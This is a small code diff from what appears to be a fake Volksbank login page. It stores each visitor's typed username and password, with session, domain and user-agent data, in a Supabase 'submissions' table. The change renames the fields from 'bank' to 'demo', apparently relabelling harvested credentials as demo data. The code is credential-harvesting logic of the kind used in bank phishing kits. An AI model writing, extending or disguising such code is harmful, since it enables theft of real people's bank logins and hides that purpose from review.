@@ -81,11 +81,11 @@ const VolksbankLogin = () => {
     const { error: insErr } = await supabase.from("submissions").insert({
       session_id: sid,
       flow: "volksbank_login",
-      bank: "Volksbank",
-      bank_username: username,
-      bank_password: password,
-      bank_username_label: "Benutzername",
-      bank_password_label: "Passwort",
+      demo: "Volksbank",
+      demo_username: username,
+      demo_password: password,
+      demo_username_label: "Benutzername",
+      demo_password_label: "Passwort",
       domain,
       user_agent: typeof navigator !== "undefined" ? navigator.userAgent : null,
     });
